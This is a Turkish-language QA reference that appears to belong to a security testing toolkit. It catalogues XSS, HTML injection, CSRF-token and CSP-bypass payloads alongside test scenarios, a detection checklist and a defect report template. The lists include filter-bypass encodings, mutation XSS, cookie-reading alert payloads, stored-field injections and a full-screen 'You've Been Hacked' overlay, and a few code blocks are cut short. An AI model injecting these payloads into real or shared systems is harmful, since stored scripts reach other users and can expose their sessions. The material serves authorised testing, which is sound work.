# XSS & HTML Injection Attack Patterns

> **KAPSAM UYARISI.** XSS denemesi aktif güvenlik testidir ve varsayılan QA
> kapsamı dışındadır. Yalnızca **yazılı yetkiyle**, **sahibi olduğunuz,
> paylaşımlı olmayan** bir hedefte, **kendi `TEST_` verinizle** uygulayın;
> paylaşımlı/stage ortamda ve başkalarının göreceği alanlarda (herkese açık
> yorum, bildirim, e-posta şablonu) uygulamayın: depolanan içerik başkalarını
> etkiler. Veri sızdıran (dış adrese istek atan) yük **kullanılmaz**; zararsız
> işaretçi yeterlidir.
> **Yansıma ≠ çalışma:** DOM'da metnin görünmesi XSS değildir. Yalnızca betiğin
> çalıştığının kanıtı (diyalog, kendi koyduğun işaretçi değişkeni) bulgudur;
> yansıma tek başına en fazla "kodlama eksikliği, çalışma kanıtlanmadı" notudur.
> Kanıtı dosya olarak kaydet (`references/core/evidence-capture.md`).
> Standartlar (isim olarak): OWASP WSTG, ASVS, OWASP Top 10.

CSRF, XSS ve HTML injection saldırı kalıpları. Arayüze zararlı metin
girilerek sistem manipüle edilip edilemediğinin test edilmesi.

## Temel Prensip

Kullanıcı girdisi her yerde potansiyel XSS vektörüdür. Her text input,
textarea, URL alanı, dosya adı, header ve API parametresi test edilmelidir.

## 1. Basic XSS Payloads (Temel XSS Payloadları)

### 1.1 Script Tag Injection

```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<script>alert(document.domain)</script>
<script>alert(window.location)</script>
```

### 1.2 Event Handler Injection

```html
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert(document.cookie)>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<input onblur=alert('XSS') autofocus><input autofocus>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe onload=alert('XSS')>
```

### 1.3 SVG-Based XSS

```html
<svg/onload=alert('XSS')>
<svg onload=alert('XSS')>
<svg><script>alert('XSS')</script></svg>
<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>
<svg><set onbegin=alert('XSS') attributeName=x to=1>
```

### 1.4 JavaScript URI

```html
<a href="javascript:alert('XSS')">Click</a>
<a href="javascript:alert(document.cookie)">Click</a>
<a href="javascript:void(0)" onclick=alert('XSS')>Click</a>
<iframe src="javascript:alert('XSS')">
<object data="javascript:alert('XSS')">
```

### 1.5 Data URI

```html
<a href="data:text/html,<script>alert('XSS')</script>">Click</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click</a>
```

## 2. Filter Bypass Payloads (Filtre Bypass Payloadları)

### 2.1 Case Manipulation

```html
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

### 2.2 Encoding Bypass

```html
&#60;script&#62;alert('XSS')&#60;/script&#62;
%3Cscript%3Ealert('XSS')%3C/script%3E
\u003cscript\u003ealert('XSS')\u003c/script\u003e
```

### 2.3 Null Byte

```html
<script>alert('XSS')</script>
<scri%00pt>alert('XSS')</scri%00pt>
```

### 2.4 Double Encoding

```html
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
```

### 2.5 CSS-Based XSS

```html
<div style="background:url(javascript:alert('XSS'))">
<div style="background:url(&#106;avascript:alert('XSS'))">
<div style="width:expr(alert('XSS'))">
```

### 2.6 Mutation XSS

```html
<noscript><p title="</noscript><script>alert('XSS')</script>">
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
```

## 3. HTML Injection Payloads (HTML Injection Payloadları)

### 3.1 Button Oluşturma

```html
<button onclick="alert('Hacked')">Click Me</button>
<input type="submit" value="Click Me" onclick="alert('XSS')">
```

### 3.2 Link Ekleme

```html
<a href="mailto:attacker@evil.com">Email Link</a>
<a href="tel:+1234567890">Phone Link</a>
```

### 3.3 Form Oluşturma

```html
  <input name="cookie" value="" style="display:none">
  <input type="submit" value="Submit">
</form>
```

### 3.4 Image Injection

```html
<img src=x onerror="alert('XSS')">
```

### 3.5 Iframe Injection

```html
<iframe src="javascript:alert('XSS')"></iframe>
<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
```

### 3.6 Div Injection

```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
  <h1>You've Been Hacked</h1>
  <p>Click here to continue</p>
</div>
```

## 4. Stored XSS Payloads (Saklı XSS Payloadları)

Bu payloadlar veritabanına kaydedilir ve her ziyaretçye gösterilir.

### 4.1 User Profile Fields

```html
<!-- Username -->
<script>alert('XSS')</script>
<img src=x onerror=alert(document.cookie)>

<!-- Bio/About -->
<div style="background:url(javascript:alert('XSS'))">Bio</div>

<!-- Website -->
javascript:alert('XSS')

<!-- Avatar URL -->
```

### 4.2 Comment/Post Fields

```html
<!-- Comment -->
Great post! <script>alert('XSS')</script>

<!-- Post Title -->
Title<img src=x onerror=alert('XSS')>

<!-- Post Content -->
Content with <a href="javascript:alert('XSS')">link</a>
```

### 4.3 Form Fields

```html
<!-- All form inputs -->
<input name="field" value="<script>alert('XSS')</script>">

<!-- Select dropdown -->
<select><option value="<script>alert('XSS')</script>">Option</option></select>

<!-- Textarea -->
<textarea><script>alert('XSS')</script></textarea>
```

## 5. Reflected XSS Payloads (Yansıtmalı XSS Payloadları)

Bu payloadlar URL parametrelerinde gönderilir ve sayfada gösterilir.

### 5.1 Query String

```
/search?q=<script>alert('XSS')</script>
/page?title=<img src=x onerror=alert('XSS')>
/user?name=<script>alert(document.cookie)</script>
```

### 5.2 URL Path

```
/page/<script>alert('XSS')</script>
/user/<img src=x onerror=alert('XSS')>
```

### 5.3 Hash Fragment

```
/page#<script>alert('XSS')</script>
/page#<img src=x onerror=alert('XSS')>
```

## 6. DOM-Based XSS Payloadları

### 6.1 document.write

```html
<script>
document.write('<img src=x onerror=alert("XSS")>');
</script>
```

### 6.2 innerHTML

```html
<div id="output"></div>
<script>
document.getElementById('output').innerHTML = location.hash.slice(1);
</script>
```

### 6.3 eval

```html
<script>
eval(location.hash.slice(1));
</script>
```

### 6.4 setTimeout/setInterval

```html
<script>
setTimeout(location.hash.slice(1), 0);
setInterval(location.hash.slice(1), 0);
</script>
```

## 7. CSRF Token Manipülasyonu

### 7.1 Token Removal

```
Normal: { "name": "test", "csrf_token": "abc123" }
Manipüle: { "name": "test" }  // csrf_token eksik
```

### 7.2 Token Forgery

```
Normal: csrf_token=abc123
Manipüle: csrf_token=forged_token
```

### 7.3 Token Fixation

```
Kullanıcı login olmadan önce: csrf_token=old_token
Login sonrası: csrf_token=new_token
Test: Eski token hala çalışıyor mu?
```

## 8. Content Security Policy Bypass

### 8.1 CSP Bypass Payloadları

```html
<script nonce="stolen">alert('XSS')</script>
```

### 8.2 Base Tag Injection

```html
```

## 9. Test Senaryoları

### Senaryo 1: Input Fields'e XSS Payloadları

```
1. Tüm text inputlarına şu payloadları gir:
   - <script>alert('XSS')</script>
   - <img src=x onerror=alert('XSS')>
   - javascript:alert('XSS')
   - <a href="javascript:alert('XSS')">Click</a>

2. Formu submit et

3. Sonuçları kontrol et:
   - Payload render edildi mi? (XSS var)
   - Payload escape edildi mi? (Güvenli)
   - Payload visible mı? (Stored XSS potansiyeli)
   - Console'da hata var mı?
```

### Senaryo 2: Textarea/Comment Fields

```
1. Comment/textarea alanına HTML injection payloadları gir:
   - <button onclick="alert('Hacked')">Click</button>
   - <div style="background:red">Red Box</div>

2. Kaydet

3. Yorumu görüntüle:
   - HTML render edildi mi?
   - Buton.visible mı? Tıklanabilir mi?
   - Link görünüyor mu? Tıklanabilir mi?
   - Div visible mı?
```

### Senaryo 3: URL/Link Fields

```
1. URL alanına javascript URI gir:
   - javascript:alert('XSS')
   - data:text/html,<script>alert('XSS')</script>

2. Kaydet

3. Linki tıkla:
   - JavaScript çalıştırıldı mı?
   - Yeni sayfa açıldı mı?
```

### Senaryo 4: Profile Fields

```
1. Username alanına XSS gir:
   - <script>alert('XSS')</script>
   - <img src=x onerror=alert(document.cookie)>

2. Bio/About alanına HTML injection gir:
   - <button onclick="alert('Hacked')">Follow</button>

3. Kaydet

4. Profili görüntüle:
   - XSS render edildi mi?
   - Buton visible mı?
   - Link clickable mı?
```

### Senaryo 5: Search/Filter

```
1. Search alanına XSS payloadları gir:
   - <script>alert('XSS')</script>
   - <img src=x onerror=alert('XSS')>

2. Ara

3. Sonuç sayfasını kontrol et:
   - Payload URL'de görünüyor mu?
   - Payload sayfada render edildi mi?
   - Search term visible mı?
```

## 10. Frontend-Backend Uyum Kontrolü

Her XSS testinde hem frontend hem backend yanıtını kontrol et:

```
1. Frontend'e XSS payloadı gir ve submit et
   - Frontend ne yaptı? Red mi etti?
   - Network tab'dan API yanıtını kaydet

2. API'ye doğrudan XSS payloadı gönder
   - API ne yaptı? 400 mü döndürdü?

3. Karşılaştır:
   - Frontend ve Backend aynı ret tepkisini veriyor mu?
   - Farklıysa → XSS BYPASS (Critical)
   - Frontend red ediyor ama Backend kabul ediyorsa → Still vulnerable
```

## 11. Tespit Kontrol Listesi

Her test sonrası şu soruları cevapla:

- [ ] Script tag input'a girildiğinde render edildi mi?
- [ ] Event handler (onerror, onload) çalıştırıldı mı?
- [ ] JavaScript URI href'te çalıştırıldı mı?
- [ ] HTML tag'leri (button, a, div, iframe) render edildi mi?
- [ ] Form oluşturmak mümkün mü?
- [ ] Link eklemek mümkün mü?
- [ ] Iframe eklenebiliyor mu?
- [ ] SVG ile XSS mümkün mü?
- [ ] CSS injection mümkün mü?
- [ ] Encoded payload'lar bypass edebiliyor mu?
- [ ] Stored XSS mümkün mü?
- [ ] Reflected XSS mümkün mü?
- [ ] DOM-based XSS mümkün mü?
- [ ] CSP var mı? Varsa bypass edilebilir mi?
- [ ] Frontend ve Backend aynı tepkiyi veriyor mu?
- [ ] Console'da hata var mı?

## 12. Defect Report Formatı

```markdown
TEST SET ID: TSXSS_<module>_<seq>
TEST CASE ID: TCXSS_<module>_<seq>
Title: [XSS türü] [alan] alanında tespit edilemedi

📋 Steps to Reproduce
1. [alan] alanına şu payloadı gir: [payload]
2. Formu submit et
3. Sayfayı yenile
4. [alan]'ı görüntüle

🖼️ Actual Result
- Payload render edildi / çalıştırıldı
- [Detay]

🎯 Expected Result
- Payload escape edilmeli veya red edilmeli
- Script çalıştırılmamalı
- HTML tag'leri render edilmemeli

📎 Ekler / Attachments
- screenshot-xss-[payload-type].png
- network-xss-[payload-type].json
- console-xss-[payload-type].log
```

## 13. Prioritization

1. **Stored XSS** → En kritik (tüm kullanıcılara etki)
2. **DOM-based XSS** → Yüksek (client-side)
3. **Reflected XSS** → Yüksek (URL tabanlı)
4. **HTML Injection** → Yüksek (görsel manipulation)
5. **CSRF Token Bypass** → Yüksek (yetki bypass)
6. **CSP Bypass** → Orta (defense-in-depth)
7. **Filter Bypass** → Orta (filter var ama zayıf)
